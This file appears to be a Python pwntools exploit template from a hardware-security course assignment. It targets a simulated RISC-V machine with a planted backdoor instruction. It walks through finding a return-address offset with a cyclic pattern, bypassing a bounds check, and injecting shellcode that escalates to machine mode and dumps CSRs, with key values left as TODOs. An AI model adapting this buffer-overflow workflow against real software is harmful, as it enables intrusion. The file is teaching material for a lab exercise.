from pwn import *

# ============================================================================
#                           HOW TO USE THIS SCRIPT
# ============================================================================
# This script has two parts:
#   Part A: Find the offset of return address (Step 2 in the spec)
#       A-1: Send cyclic pattern to find which part overwrites return address
#       A-2: Use cyclic_find() to calculate the offset
#   Part B: Build payload and exploit (Steps 3-5 in the spec)
#
# Instructions:
#   1. Complete and run Part A-1 to observe the crash
#   2. Use Part A-2 to calculate the offset from the crash output
#   3. Comment out Part A and complete Part B to perform the exploit
# ============================================================================


# ============================================================================
#                    PART A-1: SEND CYCLIC PATTERN
# ============================================================================
# Uncomment this section and run to observe which pattern overwrites ra.

# def find_offset_step1():
#     p = process(['./obj_dir/VComputer', 'build/part3/main.mem'])
#     
#     p.recvuntil(b'Enter number of data: ')
#     p.sendline(b'???')  # TODO: value that triggers the bug
#     
#     p.recvuntil(b'Enter length of each data: ')
#     p.sendline(b'???')  # TODO: the other value
#     
#     p.recvuntil(b'Enter your data')
#     
#     # cyclic(n) generates a De Bruijn sequence of length n
#     payload = cyclic(200)
#     p.sendline(payload)
#     
#     p.interactive()
#
# if __name__ == '__main__':
#     find_offset_step1()


# ============================================================================
#                    PART A-2: CALCULATE OFFSET
# ============================================================================
# After running A-1, check the exception message:
#   "[EXCEPTION!] mcause=2 mepc=XXXXXXXX mpp=0 (U-mode)"
# The value XXXXXXXX is the pattern that overwrote the return address.
# Uncomment below and replace with your value to get the offset.

# offset = cyclic_find(0xXXXXXXXX)  # TODO: Replace with value from A-1
# print(f"Offset: {offset}")


# ============================================================================
#                    PART B: BUILD PAYLOAD AND EXPLOIT
# ============================================================================
# Complete this section after you have found the offset from Part A.

def make_shellcode():
    """
    Construct shellcode that:
    1. Executes backdoor to escalate to M-mode
    2. Reads CSRs 0xFC0-0xFC7 and outputs via serial
    3. Ends with infinite loop
    """
    sc = b''
    
    # --------------------------------------------------
    # 1. Backdoor instruction: escalate to M-mode
    #    Hint: encoding is 0x000000XX where XX is your opcode from Part 2
    # --------------------------------------------------
    sc += p32(0x00000000)  # TODO: Replace with backdoor instruction
    
    # --------------------------------------------------
    # 2. Read and output CSRs 0xFC0 through 0xFC7
    #
    #    Encoding for "csrr a0, csr":
    #      (csr << 20) | (0b010 << 12) | (10 << 7) | 0b1110011
    #
    #    Encoding for "csrw 0x004, a0":
    #      0x00451073
    # --------------------------------------------------
    for csr_addr in range(0xFC0, 0xFC8):
        # TODO: Calculate and add csrr instruction
        # csrr_inst = ???
        # sc += p32(csrr_inst)
        
        sc += p32(0x00451073)  # csrw 0x004, a0 (output to serial)
    
    # --------------------------------------------------
    # 3. Infinite loop to prevent crash
    # --------------------------------------------------
    sc += p32(0x0000006F)  # jal x0, 0
    
    return sc


def exploit():
    p = process(['./obj_dir/VComputer', 'build/part3/main.mem'])
    
    # Parse buffer address
    p.recvuntil(b'inputbuf is at 0x')
    buf_addr = int(p.recvline().strip(), 16)
    print(f"[*] Buffer address: {hex(buf_addr)}")
    
    # Bypass bounds check
    p.recvuntil(b'Enter number of data: ')
    p.sendline(b'???')  # TODO
    
    p.recvuntil(b'Enter length of each data: ')
    p.sendline(b'???')  # TODO
    
    p.recvuntil(b'Enter your data')
    
    # Build payload: [shellcode] + [padding] + [return address]
    shellcode = make_shellcode()
    offset = 0  # TODO: Use the offset you found in Part A
    
    payload = b''
    # TODO: Build the payload
    # payload += shellcode
    # payload += b'A' * ???  # padding
    # payload += p32(???)    # return address
    
    p.sendline(payload)
    p.interactive()


if __name__ == '__main__':
    exploit()
